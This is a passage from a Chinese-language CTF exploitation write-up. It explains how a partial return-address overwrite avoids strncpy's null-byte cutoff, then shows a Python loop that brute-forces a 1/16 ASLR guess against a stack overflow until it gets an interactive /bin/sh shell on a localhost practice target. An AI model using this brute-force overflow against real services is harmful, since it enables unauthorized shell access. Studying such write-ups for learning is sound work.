这里跳过 push rbp 的原因是因为 strncpy 的关系，如果发送的是 \ x00,\xa9，那么先复制 \ x00，则会由于 strncpy 的机制提前结束复制，造成 a9 没办法复制进去，从而程序出错。(发送的由于是 fget 函数，所以会全盘接受，\x00 也会接受，不是读取函数的原因。) 而跳过 push rbp 并不影响 frontdoor 里面的函数执行，所以不会影响 getshell。

(3) 由于每次地址随机，所以地址随机成 a900 的概率为 1/16，那么就考虑用自动化来爆破实施：

```
#注释头
 
i = 0
while True:
    i += 1
    print i
    io.remote("127.0.0.1",0000)
    setlength()
    StackOverflow()
    try:
        io.recv(timeout = 1) 
        #要么崩溃要么爆破成功，若崩溃io会关闭，io.recv()会触发   EOFError
    except EOFError:
        io.close()
        continue
    else:
        sleep(0.1)
        io.sendline('/bin/sh\x00')
        sleep(0.1)
        io.interactive() #没有EOFError的话就是爆破成功，可以开shell
        break

```

▲如果直接 process 本地则没办法成功运行，需要用 socat 转发，用 127.0.0.1 本地连接才可以。

参考资料：

[https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157](https://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157)

[[培训] 优秀毕业生寄语：恭喜 id: 一颗金柚子获得阿里 offer《安卓高级研修班》火热招生！！！](https://zhuanlan.kanxue.com/article-15958.htm)

[#漏洞利用](forum-150-1-154.htm) [#Linux](forum-150-1-161.htm)